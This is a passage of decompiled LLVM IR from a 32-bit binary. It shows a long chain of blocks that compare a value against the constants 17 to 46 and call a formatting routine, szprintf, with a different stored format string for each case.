  %v2_8049dea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dea, i32* @ebx, align 4
  %v5_8049df1 = call i32 @szprintf(i32 %v2_8049dea, i32 ptrtoint ([13 x i8]* @global_var_805867b.47 to i32), i32 %v1_8049ddb, i32 %v1_8049dcf)
  br label %dec_label_pc_8049df9

dec_label_pc_8049df9:                             ; preds = %dec_label_pc_8049dc9, %dec_label_pc_8049dcf
  %v12_8049df9 = icmp eq i32 %v11_8049ac4, 17
  %v1_8049dfd = icmp eq i1 %v12_8049df9, false
  br i1 %v1_8049dfd, label %dec_label_pc_8049e29, label %dec_label_pc_8049dff

dec_label_pc_8049dff:                             ; preds = %dec_label_pc_8049df9
  %v0_8049dff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049dff = zext i8 %v0_8049dff to i32
  store i32 %v1_8049dff, i32* @edx, align 4
  %v0_8049e0b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049e0b = zext i8 %v0_8049e0b to i32
  %v2_8049e1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e1a, i32* @ebx, align 4
  %v5_8049e21 = call i32 @szprintf(i32 %v2_8049e1a, i32 ptrtoint ([13 x i8]* @global_var_8058688.48 to i32), i32 %v1_8049e0b, i32 %v1_8049dff)
  br label %dec_label_pc_8049e29

dec_label_pc_8049e29:                             ; preds = %dec_label_pc_8049df9, %dec_label_pc_8049dff
  %v12_8049e29 = icmp eq i32 %v11_8049ac4, 18
  %v1_8049e2d = icmp eq i1 %v12_8049e29, false
  br i1 %v1_8049e2d, label %dec_label_pc_8049e59, label %dec_label_pc_8049e2f

dec_label_pc_8049e2f:                             ; preds = %dec_label_pc_8049e29
  %v0_8049e2f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049e2f = zext i8 %v0_8049e2f to i32
  store i32 %v1_8049e2f, i32* @edx, align 4
  %v0_8049e3b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049e3b = zext i8 %v0_8049e3b to i32
  %v2_8049e4a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e4a, i32* @ebx, align 4
  %v5_8049e51 = call i32 @szprintf(i32 %v2_8049e4a, i32 ptrtoint ([13 x i8]* @global_var_8058695.49 to i32), i32 %v1_8049e3b, i32 %v1_8049e2f)
  br label %dec_label_pc_8049e59

dec_label_pc_8049e59:                             ; preds = %dec_label_pc_8049e29, %dec_label_pc_8049e2f
  %v12_8049e59 = icmp eq i32 %v11_8049ac4, 19
  %v1_8049e5d = icmp eq i1 %v12_8049e59, false
  br i1 %v1_8049e5d, label %dec_label_pc_8049e89, label %dec_label_pc_8049e5f

dec_label_pc_8049e5f:                             ; preds = %dec_label_pc_8049e59
  %v0_8049e5f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049e5f = zext i8 %v0_8049e5f to i32
  store i32 %v1_8049e5f, i32* @edx, align 4
  %v0_8049e6b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049e6b = zext i8 %v0_8049e6b to i32
  %v2_8049e7a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e7a, i32* @ebx, align 4
  %v5_8049e81 = call i32 @szprintf(i32 %v2_8049e7a, i32 ptrtoint ([11 x i8]* @global_var_80586a2.50 to i32), i32 %v1_8049e6b, i32 %v1_8049e5f)
  br label %dec_label_pc_8049e89

dec_label_pc_8049e89:                             ; preds = %dec_label_pc_8049e59, %dec_label_pc_8049e5f
  %v12_8049e89 = icmp eq i32 %v11_8049ac4, 20
  %v1_8049e8d = icmp eq i1 %v12_8049e89, false
  br i1 %v1_8049e8d, label %dec_label_pc_8049eb9, label %dec_label_pc_8049e8f

dec_label_pc_8049e8f:                             ; preds = %dec_label_pc_8049e89
  %v0_8049e8f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049e8f = zext i8 %v0_8049e8f to i32
  store i32 %v1_8049e8f, i32* @edx, align 4
  %v0_8049e9b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049e9b = zext i8 %v0_8049e9b to i32
  %v2_8049eaa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049eaa, i32* @ebx, align 4
  %v5_8049eb1 = call i32 @szprintf(i32 %v2_8049eaa, i32 ptrtoint ([12 x i8]* @global_var_80586ad.51 to i32), i32 %v1_8049e9b, i32 %v1_8049e8f)
  br label %dec_label_pc_8049eb9

dec_label_pc_8049eb9:                             ; preds = %dec_label_pc_8049e89, %dec_label_pc_8049e8f
  %v12_8049eb9 = icmp eq i32 %v11_8049ac4, 21
  %v1_8049ebd = icmp eq i1 %v12_8049eb9, false
  br i1 %v1_8049ebd, label %dec_label_pc_8049ee9, label %dec_label_pc_8049ebf

dec_label_pc_8049ebf:                             ; preds = %dec_label_pc_8049eb9
  %v0_8049ebf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049ebf = zext i8 %v0_8049ebf to i32
  store i32 %v1_8049ebf, i32* @edx, align 4
  %v0_8049ecb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049ecb = zext i8 %v0_8049ecb to i32
  %v2_8049eda = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049eda, i32* @ebx, align 4
  %v5_8049ee1 = call i32 @szprintf(i32 %v2_8049eda, i32 ptrtoint ([13 x i8]* @global_var_80586b9.52 to i32), i32 %v1_8049ecb, i32 %v1_8049ebf)
  br label %dec_label_pc_8049ee9

dec_label_pc_8049ee9:                             ; preds = %dec_label_pc_8049eb9, %dec_label_pc_8049ebf
  %v12_8049ee9 = icmp eq i32 %v11_8049ac4, 22
  %v1_8049eed = icmp eq i1 %v12_8049ee9, false
  br i1 %v1_8049eed, label %dec_label_pc_8049f19, label %dec_label_pc_8049eef

dec_label_pc_8049eef:                             ; preds = %dec_label_pc_8049ee9
  %v0_8049eef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049eef = zext i8 %v0_8049eef to i32
  store i32 %v1_8049eef, i32* @edx, align 4
  %v0_8049efb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049efb = zext i8 %v0_8049efb to i32
  %v2_8049f0a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f0a, i32* @ebx, align 4
  %v5_8049f11 = call i32 @szprintf(i32 %v2_8049f0a, i32 ptrtoint ([11 x i8]* @global_var_80586c6.53 to i32), i32 %v1_8049efb, i32 %v1_8049eef)
  br label %dec_label_pc_8049f19

dec_label_pc_8049f19:                             ; preds = %dec_label_pc_8049ee9, %dec_label_pc_8049eef
  %v12_8049f19 = icmp eq i32 %v11_8049ac4, 23
  %v1_8049f1d = icmp eq i1 %v12_8049f19, false
  br i1 %v1_8049f1d, label %dec_label_pc_8049f49, label %dec_label_pc_8049f1f

dec_label_pc_8049f1f:                             ; preds = %dec_label_pc_8049f19
  %v0_8049f1f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049f1f = zext i8 %v0_8049f1f to i32
  store i32 %v1_8049f1f, i32* @edx, align 4
  %v0_8049f2b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049f2b = zext i8 %v0_8049f2b to i32
  %v2_8049f3a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f3a, i32* @ebx, align 4
  %v5_8049f41 = call i32 @szprintf(i32 %v2_8049f3a, i32 ptrtoint ([11 x i8]* @global_var_80586d1.54 to i32), i32 %v1_8049f2b, i32 %v1_8049f1f)
  br label %dec_label_pc_8049f49

dec_label_pc_8049f49:                             ; preds = %dec_label_pc_8049f19, %dec_label_pc_8049f1f
  %v12_8049f49 = icmp eq i32 %v11_8049ac4, 24
  %v1_8049f4d = icmp eq i1 %v12_8049f49, false
  br i1 %v1_8049f4d, label %dec_label_pc_8049f79, label %dec_label_pc_8049f4f

dec_label_pc_8049f4f:                             ; preds = %dec_label_pc_8049f49
  %v0_8049f4f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049f4f = zext i8 %v0_8049f4f to i32
  store i32 %v1_8049f4f, i32* @edx, align 4
  %v0_8049f5b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049f5b = zext i8 %v0_8049f5b to i32
  %v2_8049f6a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f6a, i32* @ebx, align 4
  %v5_8049f71 = call i32 @szprintf(i32 %v2_8049f6a, i32 ptrtoint ([12 x i8]* @global_var_80586dc.55 to i32), i32 %v1_8049f5b, i32 %v1_8049f4f)
  br label %dec_label_pc_8049f79

dec_label_pc_8049f79:                             ; preds = %dec_label_pc_8049f49, %dec_label_pc_8049f4f
  %v12_8049f79 = icmp eq i32 %v11_8049ac4, 25
  %v1_8049f7d = icmp eq i1 %v12_8049f79, false
  br i1 %v1_8049f7d, label %dec_label_pc_8049fa9, label %dec_label_pc_8049f7f

dec_label_pc_8049f7f:                             ; preds = %dec_label_pc_8049f79
  %v0_8049f7f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049f7f = zext i8 %v0_8049f7f to i32
  store i32 %v1_8049f7f, i32* @edx, align 4
  %v0_8049f8b = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049f8b = zext i8 %v0_8049f8b to i32
  %v2_8049f9a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f9a, i32* @ebx, align 4
  %v5_8049fa1 = call i32 @szprintf(i32 %v2_8049f9a, i32 ptrtoint ([12 x i8]* @global_var_80586e8.56 to i32), i32 %v1_8049f8b, i32 %v1_8049f7f)
  br label %dec_label_pc_8049fa9

dec_label_pc_8049fa9:                             ; preds = %dec_label_pc_8049f79, %dec_label_pc_8049f7f
  %v12_8049fa9 = icmp eq i32 %v11_8049ac4, 26
  %v1_8049fad = icmp eq i1 %v12_8049fa9, false
  br i1 %v1_8049fad, label %dec_label_pc_8049fd9, label %dec_label_pc_8049faf

dec_label_pc_8049faf:                             ; preds = %dec_label_pc_8049fa9
  %v0_8049faf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049faf = zext i8 %v0_8049faf to i32
  store i32 %v1_8049faf, i32* @edx, align 4
  %v0_8049fbb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049fbb = zext i8 %v0_8049fbb to i32
  %v2_8049fca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fca, i32* @ebx, align 4
  %v5_8049fd1 = call i32 @szprintf(i32 %v2_8049fca, i32 ptrtoint ([12 x i8]* @global_var_80586f4.57 to i32), i32 %v1_8049fbb, i32 %v1_8049faf)
  br label %dec_label_pc_8049fd9

dec_label_pc_8049fd9:                             ; preds = %dec_label_pc_8049fa9, %dec_label_pc_8049faf
  %v12_8049fd9 = icmp eq i32 %v11_8049ac4, 27
  %v1_8049fdd = icmp eq i1 %v12_8049fd9, false
  br i1 %v1_8049fdd, label %dec_label_pc_804a009, label %dec_label_pc_8049fdf

dec_label_pc_8049fdf:                             ; preds = %dec_label_pc_8049fd9
  %v0_8049fdf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_8049fdf = zext i8 %v0_8049fdf to i32
  store i32 %v1_8049fdf, i32* @edx, align 4
  %v0_8049feb = load i8, i8* @global_var_805d499.29, align 1
  %v1_8049feb = zext i8 %v0_8049feb to i32
  %v2_8049ffa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ffa, i32* @ebx, align 4
  %v5_804a001 = call i32 @szprintf(i32 %v2_8049ffa, i32 ptrtoint ([13 x i8]* @global_var_8058700.58 to i32), i32 %v1_8049feb, i32 %v1_8049fdf)
  br label %dec_label_pc_804a009

dec_label_pc_804a009:                             ; preds = %dec_label_pc_8049fd9, %dec_label_pc_8049fdf
  %v12_804a009 = icmp eq i32 %v11_8049ac4, 28
  %v1_804a00d = icmp eq i1 %v12_804a009, false
  br i1 %v1_804a00d, label %dec_label_pc_804a039, label %dec_label_pc_804a00f

dec_label_pc_804a00f:                             ; preds = %dec_label_pc_804a009
  %v0_804a00f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a00f = zext i8 %v0_804a00f to i32
  store i32 %v1_804a00f, i32* @edx, align 4
  %v0_804a01b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a01b = zext i8 %v0_804a01b to i32
  %v2_804a02a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a02a, i32* @ebx, align 4
  %v5_804a031 = call i32 @szprintf(i32 %v2_804a02a, i32 ptrtoint ([13 x i8]* @global_var_805870d.59 to i32), i32 %v1_804a01b, i32 %v1_804a00f)
  br label %dec_label_pc_804a039

dec_label_pc_804a039:                             ; preds = %dec_label_pc_804a009, %dec_label_pc_804a00f
  %v12_804a039 = icmp eq i32 %v11_8049ac4, 29
  %v1_804a03d = icmp eq i1 %v12_804a039, false
  br i1 %v1_804a03d, label %dec_label_pc_804a069, label %dec_label_pc_804a03f

dec_label_pc_804a03f:                             ; preds = %dec_label_pc_804a039
  %v0_804a03f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a03f = zext i8 %v0_804a03f to i32
  store i32 %v1_804a03f, i32* @edx, align 4
  %v0_804a04b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a04b = zext i8 %v0_804a04b to i32
  %v2_804a05a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a05a, i32* @ebx, align 4
  %v5_804a061 = call i32 @szprintf(i32 %v2_804a05a, i32 ptrtoint ([12 x i8]* @global_var_805871a.60 to i32), i32 %v1_804a04b, i32 %v1_804a03f)
  br label %dec_label_pc_804a069

dec_label_pc_804a069:                             ; preds = %dec_label_pc_804a039, %dec_label_pc_804a03f
  %v12_804a069 = icmp eq i32 %v11_8049ac4, 30
  %v1_804a06d = icmp eq i1 %v12_804a069, false
  br i1 %v1_804a06d, label %dec_label_pc_804a099, label %dec_label_pc_804a06f

dec_label_pc_804a06f:                             ; preds = %dec_label_pc_804a069
  %v0_804a06f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a06f = zext i8 %v0_804a06f to i32
  store i32 %v1_804a06f, i32* @edx, align 4
  %v0_804a07b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a07b = zext i8 %v0_804a07b to i32
  %v2_804a08a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a08a, i32* @ebx, align 4
  %v5_804a091 = call i32 @szprintf(i32 %v2_804a08a, i32 ptrtoint ([13 x i8]* @global_var_8058726.61 to i32), i32 %v1_804a07b, i32 %v1_804a06f)
  br label %dec_label_pc_804a099

dec_label_pc_804a099:                             ; preds = %dec_label_pc_804a069, %dec_label_pc_804a06f
  %v12_804a099 = icmp eq i32 %v11_8049ac4, 31
  %v1_804a09d = icmp eq i1 %v12_804a099, false
  br i1 %v1_804a09d, label %dec_label_pc_804a0c9, label %dec_label_pc_804a09f

dec_label_pc_804a09f:                             ; preds = %dec_label_pc_804a099
  %v0_804a09f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a09f = zext i8 %v0_804a09f to i32
  store i32 %v1_804a09f, i32* @edx, align 4
  %v0_804a0ab = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a0ab = zext i8 %v0_804a0ab to i32
  %v2_804a0ba = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ba, i32* @ebx, align 4
  %v5_804a0c1 = call i32 @szprintf(i32 %v2_804a0ba, i32 ptrtoint ([12 x i8]* @global_var_8058733.62 to i32), i32 %v1_804a0ab, i32 %v1_804a09f)
  br label %dec_label_pc_804a0c9

dec_label_pc_804a0c9:                             ; preds = %dec_label_pc_804a099, %dec_label_pc_804a09f
  %v9_804a0c9 = icmp eq i32 %v11_8049ac4, 32
  %v1_804a0cd = icmp eq i1 %v9_804a0c9, false
  br i1 %v1_804a0cd, label %dec_label_pc_804a0f9, label %dec_label_pc_804a0cf

dec_label_pc_804a0cf:                             ; preds = %dec_label_pc_804a0c9
  %v0_804a0cf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a0cf = zext i8 %v0_804a0cf to i32
  store i32 %v1_804a0cf, i32* @edx, align 4
  %v0_804a0db = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a0db = zext i8 %v0_804a0db to i32
  %v2_804a0ea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0ea, i32* @ebx, align 4
  %v5_804a0f1 = call i32 @szprintf(i32 %v2_804a0ea, i32 ptrtoint ([11 x i8]* @global_var_805873f.63 to i32), i32 %v1_804a0db, i32 %v1_804a0cf)
  br label %dec_label_pc_804a0f9

dec_label_pc_804a0f9:                             ; preds = %dec_label_pc_804a0c9, %dec_label_pc_804a0cf
  %v12_804a0f9 = icmp eq i32 %v11_8049ac4, 33
  %v1_804a0fd = icmp eq i1 %v12_804a0f9, false
  br i1 %v1_804a0fd, label %dec_label_pc_804a129, label %dec_label_pc_804a0ff

dec_label_pc_804a0ff:                             ; preds = %dec_label_pc_804a0f9
  %v0_804a0ff = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a0ff = zext i8 %v0_804a0ff to i32
  store i32 %v1_804a0ff, i32* @edx, align 4
  %v0_804a10b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a10b = zext i8 %v0_804a10b to i32
  %v2_804a11a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a11a, i32* @ebx, align 4
  %v5_804a121 = call i32 @szprintf(i32 %v2_804a11a, i32 ptrtoint ([12 x i8]* @global_var_805874a.64 to i32), i32 %v1_804a10b, i32 %v1_804a0ff)
  br label %dec_label_pc_804a129

dec_label_pc_804a129:                             ; preds = %dec_label_pc_804a0f9, %dec_label_pc_804a0ff
  %v12_804a129 = icmp eq i32 %v11_8049ac4, 34
  %v1_804a12d = icmp eq i1 %v12_804a129, false
  br i1 %v1_804a12d, label %dec_label_pc_804a159, label %dec_label_pc_804a12f

dec_label_pc_804a12f:                             ; preds = %dec_label_pc_804a129
  %v0_804a12f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a12f = zext i8 %v0_804a12f to i32
  store i32 %v1_804a12f, i32* @edx, align 4
  %v0_804a13b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a13b = zext i8 %v0_804a13b to i32
  %v2_804a14a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a14a, i32* @ebx, align 4
  %v5_804a151 = call i32 @szprintf(i32 %v2_804a14a, i32 ptrtoint ([12 x i8]* @global_var_8058756.65 to i32), i32 %v1_804a13b, i32 %v1_804a12f)
  br label %dec_label_pc_804a159

dec_label_pc_804a159:                             ; preds = %dec_label_pc_804a129, %dec_label_pc_804a12f
  %v12_804a159 = icmp eq i32 %v11_8049ac4, 35
  %v1_804a15d = icmp eq i1 %v12_804a159, false
  br i1 %v1_804a15d, label %dec_label_pc_804a189, label %dec_label_pc_804a15f

dec_label_pc_804a15f:                             ; preds = %dec_label_pc_804a159
  %v0_804a15f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a15f = zext i8 %v0_804a15f to i32
  store i32 %v1_804a15f, i32* @edx, align 4
  %v0_804a16b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a16b = zext i8 %v0_804a16b to i32
  %v2_804a17a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a17a, i32* @ebx, align 4
  %v5_804a181 = call i32 @szprintf(i32 %v2_804a17a, i32 ptrtoint ([12 x i8]* @global_var_8058762.66 to i32), i32 %v1_804a16b, i32 %v1_804a15f)
  br label %dec_label_pc_804a189

dec_label_pc_804a189:                             ; preds = %dec_label_pc_804a159, %dec_label_pc_804a15f
  %v12_804a189 = icmp eq i32 %v11_8049ac4, 36
  %v1_804a18d = icmp eq i1 %v12_804a189, false
  br i1 %v1_804a18d, label %dec_label_pc_804a1b9, label %dec_label_pc_804a18f

dec_label_pc_804a18f:                             ; preds = %dec_label_pc_804a189
  %v0_804a18f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a18f = zext i8 %v0_804a18f to i32
  store i32 %v1_804a18f, i32* @edx, align 4
  %v0_804a19b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a19b = zext i8 %v0_804a19b to i32
  %v2_804a1aa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1aa, i32* @ebx, align 4
  %v5_804a1b1 = call i32 @szprintf(i32 %v2_804a1aa, i32 ptrtoint ([12 x i8]* @global_var_805876e.67 to i32), i32 %v1_804a19b, i32 %v1_804a18f)
  br label %dec_label_pc_804a1b9

dec_label_pc_804a1b9:                             ; preds = %dec_label_pc_804a189, %dec_label_pc_804a18f
  %v12_804a1b9 = icmp eq i32 %v11_8049ac4, 37
  %v1_804a1bd = icmp eq i1 %v12_804a1b9, false
  br i1 %v1_804a1bd, label %dec_label_pc_804a1e9, label %dec_label_pc_804a1bf

dec_label_pc_804a1bf:                             ; preds = %dec_label_pc_804a1b9
  %v0_804a1bf = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a1bf = zext i8 %v0_804a1bf to i32
  store i32 %v1_804a1bf, i32* @edx, align 4
  %v0_804a1cb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a1cb = zext i8 %v0_804a1cb to i32
  %v2_804a1da = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1da, i32* @ebx, align 4
  %v5_804a1e1 = call i32 @szprintf(i32 %v2_804a1da, i32 ptrtoint ([12 x i8]* @global_var_805877a.68 to i32), i32 %v1_804a1cb, i32 %v1_804a1bf)
  br label %dec_label_pc_804a1e9

dec_label_pc_804a1e9:                             ; preds = %dec_label_pc_804a1b9, %dec_label_pc_804a1bf
  %v12_804a1e9 = icmp eq i32 %v11_8049ac4, 38
  %v1_804a1ed = icmp eq i1 %v12_804a1e9, false
  br i1 %v1_804a1ed, label %dec_label_pc_804a219, label %dec_label_pc_804a1ef

dec_label_pc_804a1ef:                             ; preds = %dec_label_pc_804a1e9
  %v0_804a1ef = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a1ef = zext i8 %v0_804a1ef to i32
  store i32 %v1_804a1ef, i32* @edx, align 4
  %v0_804a1fb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a1fb = zext i8 %v0_804a1fb to i32
  %v2_804a20a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a20a, i32* @ebx, align 4
  %v5_804a211 = call i32 @szprintf(i32 %v2_804a20a, i32 ptrtoint ([13 x i8]* @global_var_8058786.69 to i32), i32 %v1_804a1fb, i32 %v1_804a1ef)
  br label %dec_label_pc_804a219

dec_label_pc_804a219:                             ; preds = %dec_label_pc_804a1e9, %dec_label_pc_804a1ef
  %v12_804a219 = icmp eq i32 %v11_8049ac4, 39
  %v1_804a21d = icmp eq i1 %v12_804a219, false
  br i1 %v1_804a21d, label %dec_label_pc_804a249, label %dec_label_pc_804a21f

dec_label_pc_804a21f:                             ; preds = %dec_label_pc_804a219
  %v0_804a21f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a21f = zext i8 %v0_804a21f to i32
  store i32 %v1_804a21f, i32* @edx, align 4
  %v0_804a22b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a22b = zext i8 %v0_804a22b to i32
  %v2_804a23a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a23a, i32* @ebx, align 4
  %v5_804a241 = call i32 @szprintf(i32 %v2_804a23a, i32 ptrtoint ([13 x i8]* @global_var_8058793.70 to i32), i32 %v1_804a22b, i32 %v1_804a21f)
  br label %dec_label_pc_804a249

dec_label_pc_804a249:                             ; preds = %dec_label_pc_804a219, %dec_label_pc_804a21f
  %v12_804a249 = icmp eq i32 %v11_8049ac4, 40
  %v1_804a24d = icmp eq i1 %v12_804a249, false
  br i1 %v1_804a24d, label %dec_label_pc_804a279, label %dec_label_pc_804a24f

dec_label_pc_804a24f:                             ; preds = %dec_label_pc_804a249
  %v0_804a24f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a24f = zext i8 %v0_804a24f to i32
  store i32 %v1_804a24f, i32* @edx, align 4
  %v0_804a25b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a25b = zext i8 %v0_804a25b to i32
  %v2_804a26a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a26a, i32* @ebx, align 4
  %v5_804a271 = call i32 @szprintf(i32 %v2_804a26a, i32 ptrtoint ([13 x i8]* @global_var_8058786.69 to i32), i32 %v1_804a25b, i32 %v1_804a24f)
  br label %dec_label_pc_804a279

dec_label_pc_804a279:                             ; preds = %dec_label_pc_804a249, %dec_label_pc_804a24f
  %v12_804a279 = icmp eq i32 %v11_8049ac4, 41
  %v1_804a27d = icmp eq i1 %v12_804a279, false
  br i1 %v1_804a27d, label %dec_label_pc_804a2a9, label %dec_label_pc_804a27f

dec_label_pc_804a27f:                             ; preds = %dec_label_pc_804a279
  %v0_804a27f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a27f = zext i8 %v0_804a27f to i32
  store i32 %v1_804a27f, i32* @edx, align 4
  %v0_804a28b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a28b = zext i8 %v0_804a28b to i32
  %v2_804a29a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a29a, i32* @ebx, align 4
  %v5_804a2a1 = call i32 @szprintf(i32 %v2_804a29a, i32 ptrtoint ([13 x i8]* @global_var_80587a0.71 to i32), i32 %v1_804a28b, i32 %v1_804a27f)
  br label %dec_label_pc_804a2a9

dec_label_pc_804a2a9:                             ; preds = %dec_label_pc_804a279, %dec_label_pc_804a27f
  %v12_804a2a9 = icmp eq i32 %v11_8049ac4, 42
  %v1_804a2ad = icmp eq i1 %v12_804a2a9, false
  br i1 %v1_804a2ad, label %dec_label_pc_804a2d9, label %dec_label_pc_804a2af

dec_label_pc_804a2af:                             ; preds = %dec_label_pc_804a2a9
  %v0_804a2af = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a2af = zext i8 %v0_804a2af to i32
  store i32 %v1_804a2af, i32* @edx, align 4
  %v0_804a2bb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a2bb = zext i8 %v0_804a2bb to i32
  %v2_804a2ca = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2ca, i32* @ebx, align 4
  %v5_804a2d1 = call i32 @szprintf(i32 %v2_804a2ca, i32 ptrtoint ([13 x i8]* @global_var_80587ad.72 to i32), i32 %v1_804a2bb, i32 %v1_804a2af)
  br label %dec_label_pc_804a2d9

dec_label_pc_804a2d9:                             ; preds = %dec_label_pc_804a2a9, %dec_label_pc_804a2af
  %v12_804a2d9 = icmp eq i32 %v11_8049ac4, 43
  %v1_804a2dd = icmp eq i1 %v12_804a2d9, false
  br i1 %v1_804a2dd, label %dec_label_pc_804a309, label %dec_label_pc_804a2df

dec_label_pc_804a2df:                             ; preds = %dec_label_pc_804a2d9
  %v0_804a2df = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a2df = zext i8 %v0_804a2df to i32
  store i32 %v1_804a2df, i32* @edx, align 4
  %v0_804a2eb = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a2eb = zext i8 %v0_804a2eb to i32
  %v2_804a2fa = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a2fa, i32* @ebx, align 4
  %v5_804a301 = call i32 @szprintf(i32 %v2_804a2fa, i32 ptrtoint ([13 x i8]* @global_var_80587ba.73 to i32), i32 %v1_804a2eb, i32 %v1_804a2df)
  br label %dec_label_pc_804a309

dec_label_pc_804a309:                             ; preds = %dec_label_pc_804a2d9, %dec_label_pc_804a2df
  %v12_804a309 = icmp eq i32 %v11_8049ac4, 44
  %v1_804a30d = icmp eq i1 %v12_804a309, false
  br i1 %v1_804a30d, label %dec_label_pc_804a339, label %dec_label_pc_804a30f

dec_label_pc_804a30f:                             ; preds = %dec_label_pc_804a309
  %v0_804a30f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a30f = zext i8 %v0_804a30f to i32
  store i32 %v1_804a30f, i32* @edx, align 4
  %v0_804a31b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a31b = zext i8 %v0_804a31b to i32
  %v2_804a32a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a32a, i32* @ebx, align 4
  %v5_804a331 = call i32 @szprintf(i32 %v2_804a32a, i32 ptrtoint ([13 x i8]* @global_var_80587ad.72 to i32), i32 %v1_804a31b, i32 %v1_804a30f)
  br label %dec_label_pc_804a339

dec_label_pc_804a339:                             ; preds = %dec_label_pc_804a309, %dec_label_pc_804a30f
  %v12_804a339 = icmp eq i32 %v11_8049ac4, 45
  %v1_804a33d = icmp eq i1 %v12_804a339, false
  br i1 %v1_804a33d, label %dec_label_pc_804a369, label %dec_label_pc_804a33f

dec_label_pc_804a33f:                             ; preds = %dec_label_pc_804a339
  %v0_804a33f = load i8, i8* @global_var_805d49a.30, align 2
  %v1_804a33f = zext i8 %v0_804a33f to i32
  store i32 %v1_804a33f, i32* @edx, align 4
  %v0_804a34b = load i8, i8* @global_var_805d499.29, align 1
  %v1_804a34b = zext i8 %v0_804a34b to i32
  %v2_804a35a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a35a, i32* @ebx, align 4
  %v5_804a361 = call i32 @szprintf(i32 %v2_804a35a, i32 ptrtoint ([13 x i8]* @global_var_80587c7.74 to i32), i32 %v1_804a34b, i32 %v1_804a33f)
  br label %dec_label_pc_804a369

dec_label_pc_804a369:                             ; preds = %dec_label_pc_804a339, %dec_label_pc_804a33f
  %v12_804a369 = icmp eq i32 %v11_8049ac4, 46
  %v1_804a36d = icmp eq i1 %v12_804a369, false
  br i1 %v1_804a36d, label %dec_label_pc_804a399, label %dec_label_pc_804a36f

dec_label_pc_804a36f:                             ; preds = %dec_label_pc_804a369
